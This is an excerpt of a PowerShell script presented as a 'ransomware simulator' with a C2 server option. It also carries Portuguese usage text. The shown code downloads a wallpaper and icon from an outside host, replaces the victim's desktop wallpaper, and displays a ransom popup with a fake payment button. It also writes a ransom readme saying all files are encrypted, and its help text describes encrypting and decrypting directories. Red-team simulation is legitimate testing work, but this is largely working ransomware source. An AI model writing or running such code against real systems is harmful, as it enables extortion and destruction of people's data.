...
$Host.UI.RawUI.WindowTitle = "Red Simulator RSW - by 0xsl4p" 
...
function Show-Banner {
    Write-Host
    Write-Host "  ____  _      _   ____                                  " -ForegroundColor Blue
    Write-Host " / ___|| | ___| |_/ ___|  ___  _ __ __ _ _ __ ___  ___   " -ForegroundColor Blue
    Write-Host " \___ \| |/ _ \ __\___ \ / _ \| '__/ _` | '_ ` _ \/ __|  " -ForegroundColor Blue
    Write-Host "  ___) | |  __/ |_ ___) | (_) | | | (_| | | | | | \__ \  " -ForegroundColor Blue
    Write-Host " |____/|_|\___|\__|____/ \___/|_|  \__,_|_| |_| |_|___/  " -ForegroundColor Blue
    Write-Host
    Write-Host "  ----------------- by 0xsl4p ----------------  " -ForegroundColor Red
}
# Help
function Show-Help {
   Write-host ; Write-Host " Info: " -ForegroundColor Green -NoNewLine ; Write-Host " Ferramenta para Simular um"
   Write-Host "        ransomware generico em PowerShell com C2 "
   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\sl4p-ransom.ps1 -e Directory -s C2Server -p C2Port" -ForegroundColor Blue 
   ...
   Write-Host ; Write-Host "        .\sl4p-ransom.ps1 -d Directory -k RecoveryKey" -ForegroundColor Blue 
...
function PopUpRansom {
    ...
    Invoke-WebRequest -useb http://10.1.0.15:8000/imagem-wallpaper.jpg -Outfile $env:temp\imagem-wallpaper.jpg
    Invoke-WebRequest -useb http://10.1.0.15:8000/3792021-halloween-horror-skeleton-skull_109032.ico -Outfile $env:temp\3792021-halloween-horror-skeleton-skull_109032.ico

    # Setting the wallpaper using SystemParametersInfo
    $code = @"
    using System;
    using System.Runtime.InteropServices;
...
"@
    ...
    $wallpaperPath = "$env:temp\imagem-wallpaper.jpg"
    
    try {
        $result = [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $wallpaperPath, $UpdateIniFile -bor $SendWinIniChange)
        if ($result -eq 0) {
    ...
    $form.Text = "Sl4pRansom by @0xsl4p"
    $formIcon = New-Object system.drawing.icon ("$env:temp\3792021-halloween-horror-skeleton-skull_109032.ico")
    $form.Icon = $formIcon

    # Add the PictureBox first
    $img = [System.Drawing.Image]::Fromfile("$env:temp\imagem-wallpaper.jpg")
    ...
    # Add the Labels and Button
    $label = New-Object System.Windows.Forms.Label
    $label.ForeColor = "Cyan"
    $label.Text = "All your files have been encrypted by PurpleTeam Softwall Ransomware!"
    $label.AutoSize = $true
    ...
    $okButton.Add_Click({
        [System.Windows.Forms.MessageBox]::Show($form, 'Your payment order has been registered!', 'Sl4pRansom Payment System',
...
function CreateReadme {
   $ReadmeTXT = "All your files have been encrypted by PurpleTeam Softwall!`nBut don't worry, you can still recover them with the recovery key :)`n"
